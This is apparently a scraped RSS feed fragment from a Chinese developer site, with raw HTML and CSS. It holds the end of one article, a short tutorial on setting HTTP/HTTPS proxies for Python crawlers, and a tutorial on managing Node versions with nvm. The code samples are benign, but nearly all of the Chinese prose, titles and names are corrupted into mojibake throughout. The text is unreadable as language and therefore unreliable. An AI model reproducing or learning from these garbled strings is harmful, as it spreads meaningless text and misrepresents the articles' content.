<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/049764f7273642689f99e9eea36dcea5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=GJaABCYrVl%2FwGeeuOqdyTffWfWQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p><strong>ï¼ˆæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”çœ‹ä¸‹å›åˆ†è§£ï¼šInlineArray â€”â€” å½“å…ƒç»„å’Œæ•°ç»„ç”Ÿäº†ä¸ªæ··è¡€å„¿ï¼Œç†ŠçŒ«çš„ç«¹ç¬‹ç»ˆäºæœ‰åœ°å„¿æ”¾äº†ã€‚ï¼‰</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1b680a865244ec093beaaab072db6b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=5DTKUTynqygHh3%2F0QyOFMGw5ZXU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«ä¸­HTTPå’ŒHTTPSä»£ç†çš„å®Œæ•´ä½¿ç”¨æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7589206614929244200</link>    <guid>https://juejin.cn/post/7589206614929244200</guid>    <pubDate>2025-12-30T02:24:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614929244200" data-draft-id="7589181008098770959" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonç½‘ç»œçˆ¬è™«ä¸­HTTPå’ŒHTTPSä»£ç†çš„å®Œæ•´ä½¿ç”¨æ•™ç¨‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-30T02:24:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒçŒ´çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonç½‘ç»œçˆ¬è™«ä¸­HTTPå’ŒHTTPSä»£ç†çš„å®Œæ•´ä½¿ç”¨æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒçŒ´çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:24:23.000Z" title="Tue Dec 30 2025 02:24:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>pythonä½¿ç”¨httpã€httpsä»£ç†</p>
<p>åœ¨å›½å†…åˆ©ç”¨Pythonä»Internetä¸Šçˆ¬å–æ•°æ®æ—¶ï¼Œæœ‰äº›ç½‘ç«™æˆ–APIæ¥å£è¢«é™é€Ÿæˆ–å±è”½ï¼Œè¿™æ—¶ä½¿ç”¨ä»£ç†å¯ä»¥åŠ é€Ÿçˆ¬å–è¿‡ç¨‹ï¼Œå‡å°‘è¯·æ±‚å¤±è´¥ï¼ŒPythonç¨‹åºä½¿ç”¨ä»£ç†çš„æ–¹æ³•ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<p>ï¼ˆ1ï¼‰å¦‚æœæ˜¯åœ¨ä»£ç ä¸­ä½¿ç”¨ä¸€äº›ç½‘ç»œåº“æˆ–çˆ¬è™«æ¡†æ¶è¿›è¡Œæ•°æ®çˆ¬å–ï¼Œä¸€èˆ¬è¿™ç§æ¡†æ¶éƒ½ä¼šæ”¯æŒè®¾ç½®ä»£ç†ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">
import urllib.request as urlreq
<span class="hljs-attr">ph</span> = urlreq.ProxyHandler({<span class="hljs-string">'https'</span>: <span class="hljs-string">'https://127.0.0.1:1080'</span>})
<span class="hljs-attr">oper</span> = urlreq.build_opener(ph)
urlreq.install_opener(oper)
<span class="hljs-attr">res</span> = oper.open(<span class="hljs-string">"https://www.google.com"</span>)
print(res.read())
</code></pre>
<pre><code class="hljs"/></pre>
<pre><code class="hljs language-dart" lang="dart">
<span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req
<span class="hljs-built_in">print</span>(req.<span class="hljs-keyword">get</span>(<span class="hljs-string">"https://www.google.com"</span>, proxies={<span class="hljs-string">'https'</span>: <span class="hljs-string">'https://127.0.0.1:1080'</span>}).content)
</code></pre>
<p>ï¼ˆ2ï¼‰å¦‚æœä½¿ç”¨çš„åº“æ²¡æœ‰æä¾›è®¾ç½®ä»£ç†çš„æ¥å£ï¼Œä½†æ˜¯åº•å±‚ä½¿ç”¨äº†urllibã€requestsç­‰åº“ï¼Œå¯ä»¥å°è¯•è®¾ç½®HTTP_PROXY å’ŒHTTPS_PROXYç¯å¢ƒå˜é‡ï¼Œå¸¸ç”¨çš„ç½‘ç»œåº“ä¼šè‡ªåŠ¨è¯†åˆ«è¿™äº›ç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨å˜é‡è®¾ç½®çš„ä»£ç†å‘èµ·è¯·æ±‚ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-lua" lang="lua">
import <span class="hljs-built_in">os</span>
<span class="hljs-built_in">os</span>.environ[<span class="hljs-string">'http_proxy'</span>] = <span class="hljs-string">'http://127.0.0.1:1080'</span>
<span class="hljs-built_in">os</span>.environ[<span class="hljs-string">'https_proxy'</span>] = <span class="hljs-string">'https://127.0.0.1:1080'</span>
</code></pre>
<p>ï¼ˆ3ï¼‰å¦‚æœä¸Šè¿°ä¸¤ç§æ–¹æ³•éƒ½æ²¡æœ‰ç”¨ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›å¯ä»¥ç›‘å¬ã€æ‹¦æˆªå’Œä¿®æ”¹ç½‘ç»œåŒ…çš„å·¥å…·å’Œåº“å¦‚ï¼ˆFiddlerã€mitmproxyã€Sniffmasterï¼‰æ¥æ‹¦æˆªhttpè¯·æ±‚åŒ…å¹¶ä¿®æ”¹åœ°å€ï¼Œè¾¾åˆ°ä½¿ç”¨ä»£ç†çš„æ•ˆæœã€‚Sniffmasteræ˜¯ä¸€æ¬¾å…¨å¹³å°æŠ“åŒ…å·¥å…·ï¼Œæ”¯æŒHTTPSã€TCPå’ŒUDPåè®®æŠ“åŒ…ï¼Œæ— éœ€è®¾ç½®ä»£ç†å³å¯è§£å¯†HTTPSæµé‡ï¼Œè¿˜æä¾›ä»£ç†æŠ“åŒ…åŠŸèƒ½ï¼Œé€‚ç”¨äºå¤šç§è®¾å¤‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€å·¥å…·ç¯‡ã€‘ä½¿ç”¨ nvm è¿›è¡Œ node ç‰ˆæœ¬ç®¡ç†]]></title>    <link>https://juejin.cn/post/7589171972447060010</link>    <guid>https://juejin.cn/post/7589171972447060010</guid>    <pubDate>2025-12-30T02:29:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589171972447060010" data-draft-id="7589171972446961706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€å·¥å…·ç¯‡ã€‘ä½¿ç”¨ nvm è¿›è¡Œ node ç‰ˆæœ¬ç®¡ç†"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js,NPM"/> <meta itemprop="datePublished" content="2025-12-30T02:29:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é—²äº‘ä¸€é¹¤"/> <meta itemprop="url" content="https://juejin.cn/user/729731452122382"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€å·¥å…·ç¯‡ã€‘ä½¿ç”¨ nvm è¿›è¡Œ node ç‰ˆæœ¬ç®¡ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731452122382/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é—²äº‘ä¸€é¹¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:29:35.000Z" title="Tue Dec 30 2025 02:29:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å½“æ¥è§¦çš„é¡¹ç›®è¿‡å¤šæ—¶å°±ä¼šå‘ç°ï¼Œç‰¹å–µçš„æ€ä¹ˆæ¯ä¸ªé¡¹ç›®çš„ node.js ç‰ˆæœ¬éƒ½ä¸ä¸€è‡´ï¼Ÿï¼</p>
<p>ä½ç‰ˆæœ¬ node æ— æ³•è¿è¡Œé«˜ç‰ˆæœ¬é¡¹ç›®ï¼Œé«˜ç‰ˆæœ¬ node åˆä¸å…¼å®¹ä½ç‰ˆæœ¬é¡¹ç›®</p>
<p>å¦‚ä½•å¿«é€Ÿçš„æ¥å›åˆ‡æ¢ node ç‰ˆæœ¬æˆä¸ºäº†æ¯ä¸€åå‰ç«¯åŒä»çš„å¿…å¤‡æŠ€èƒ½</p>
<p>ä¸ºè§£å†³æ­¤ç—›ç‚¹ï¼Œå¸‚é¢ä¸Šå‡ºç°äº†å¾ˆå¤šçš„ node ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼šnvmã€nvsã€Voltaã€fnm ç­‰ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ nvm ä½œæ•™ç¨‹è®²è§£</p>
<h2 data-id="heading-1">1. å®‰è£… nvm</h2>
<blockquote>
<p>æ³¨æ„ï¼šå®‰è£… nvm ä¹‹å‰ï¼Œä¸€å®šå¾—å…ˆå¸è½½å¹²å‡€ node.jsï¼ï¼ï¼</p>
</blockquote>
<blockquote>
<p>æ³¨æ„ï¼šæœ‰äº† nvm å°±ä¸éœ€è¦å•ç‹¬å®‰è£… node äº†ï¼Œç›´æ¥ä½¿ç”¨ nvm å®‰è£…åˆ‡æ¢ node ç‰ˆæœ¬å³å¯</p>
</blockquote>
<p>windows é€‚ç”¨ç‰ˆæœ¬ä¸º nvm-windowsï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoreybutler%2Fnvm-windows%2Freleases" target="_blank" title="https://github.com/coreybutler/nvm-windows/releases" ref="nofollow noopener noreferrer">github.com/coreybutlerâ€¦</a></p>
<p>ä¸‹è½½å®‰è£…åŒ…ï¼ˆ<code>nvm-setup.exe</code>ï¼‰å®‰è£…åˆ°æœ¬åœ°(é€‰æ‹©é»˜è®¤å®‰è£…è·¯å¾„å¹¶ä¸”ä¸€ç›´ç‚¹å‡»ä¸‹ä¸€æ­¥å³å¯)ï¼Œæ³¨æ„è‡ªå®šä¹‰è·¯å¾„æ³¨æ„ä¸èƒ½æœ‰ä¸­æ–‡æˆ–è€…ç©ºæ ¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f81107733104ddfadc843d7fd552999~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=lfBGoYc5atQTkMZMXLgl0n%2BX1l4%3D" alt="1.png" loading="lazy"/></p>
<p>æç¤ºï¼è®°ä½è¿™é‡Œçš„å®‰è£…ç›®å½•ï¼Œåé¢ç”¨å¾—ä¸Šï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a78f7545b8245919f7900b2272ce7a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=R4%2F1NodkR%2Bs4uqmLEWhD0%2FVisXE%3D" alt="2.png" loading="lazy"/></p>
<h2 data-id="heading-2">2. node å®‰è£…ä¸åˆ‡æ¢</h2>
<p>è¾“å…¥å‘½ä»¤ <code>nvm v</code> èƒ½æ˜¾ç¤ºå½“å‰ nvm ç‰ˆæœ¬å·å³è¯´æ˜å®‰è£…æˆåŠŸ</p>
<p>ç„¶åä¸‹è½½ä¸€ä¸ª node ç‰ˆæœ¬</p>
<pre><code class="hljs language-bash" lang="bash">nvm install 16
</code></pre>
<p>åˆ‡æ¢åˆ° node 16</p>
<pre><code class="hljs language-bash" lang="bash">nvm use 16
</code></pre>
<p>æŸ¥çœ‹ nvm ä¸­å®‰è£…çš„ node ç‰ˆæœ¬åˆ—è¡¨ï¼Œä»¥åŠå½“å‰æ‰€é€‰æ‹©ç‰ˆæœ¬ï¼ˆæ˜Ÿå·ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash">nvm list
</code></pre>
<p>ç„¶åå°±å¯ä»¥é€šè¿‡ <code>node -v</code> å’Œ <code>npm -v</code> å‘½ä»¤æŸ¥è¯¢åˆ°å½“å‰çš„ node å’Œ npm ç‰ˆæœ¬äº†</p>
<p>æ³¨æ„ï¼npm ç‰ˆæœ¬æ˜¯è·Ÿéš node ç‰ˆæœ¬å˜åŠ¨çš„ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5aa40abca5a54ea98d38b72ee6cc87c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=CEASUCLzrpzcDZCPbjUweltp0Wk%3D" alt="3.png" loading="lazy"/></p>
<h2 data-id="heading-3">3. è®¾ç½®æ·˜å®æº</h2>
<blockquote>
<p>ç”±äºå›½å†…ç½‘ç»œç­‰åŸå› ï¼Œä½¿ç”¨ mpm install xxx å®‰è£…ä¾èµ–åŒ…çš„è¿‡ç¨‹ä¸­ä¼šå‡ºç°å®‰è£…è¿‡æ…¢ä»¥åŠå¤±è´¥å¯¼è‡´æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ npm é•œåƒæºæŒ‡å‘å›½å†…<code>æ·˜å® npm é•œåƒæº</code></p>
</blockquote>
<p>å‰é¢æé†’çš„ nvm å®‰è£…ç›®å½•è¿˜è®°å¾—ä½å—ï¼Ÿé»˜è®¤ç›®å½•ä¸€èˆ¬åœ¨è¿™ä¸ªä½ç½®â€œC:\Users\ä½ çš„ç”¨æˆ·å\AppData\Local\nvmâ€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1539a6c819c4d5a9ef45b2f5aea7752~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=IDLh0noUliy%2Fzna%2FZ3p4IbDo8TQ%3D" alt="4.png" loading="lazy"/></p>
<p>å¦‚æœå®åœ¨æ‰¾ä¸åˆ°äº†ï¼Œå°±å†é‡æ–°å®‰è£…ä¸€æ¬¡å§</p>
<p>éª—ä½ çš„å“ˆå“ˆï¼Œå¯ä»¥ cmd è¿è¡Œ<code>nvm root</code>è¿™ä¸ªå‘½ä»¤æŸ¥çœ‹ nvm çš„å®‰è£…æ ¹è·¯å¾„åœ¨å“ªä¸ªæ–‡ä»¶å¤¹</p>
<p>æ‰¾åˆ° nvm å®‰è£…ç›®å½•ä¸‹é¢çš„ <code>settings.txt</code> æ–‡ä»¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec756a53004e426bbbef4e74303d6faf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=VZEMqylOLsGR%2F%2FL%2BqYXFmCmJH84%3D" alt="5.png" loading="lazy"/></p>
<p>è®°äº‹æœ¬æ‰“å¼€ â€œsettings.txtâ€ æ–‡ä»¶å¹¶åœ¨åé¢ç²˜è´´ä¸‹é¢ä¸¤å¥è¯å³å¯</p>
<pre><code class="hljs language-cmd" lang="cmd">node_mirror: https://npmmirror.com/mirrors/node/
npm_mirror: https://npmmirror.com/mirrors/npm/
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab2995b7e35342cd94453fa0a8000ee3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666575&amp;x-signature=fdQ%2FCDR8iBCn%2FY%2FB9DI%2Bl1pixBc%3D" alt="6.png" loading="lazy"/></p>
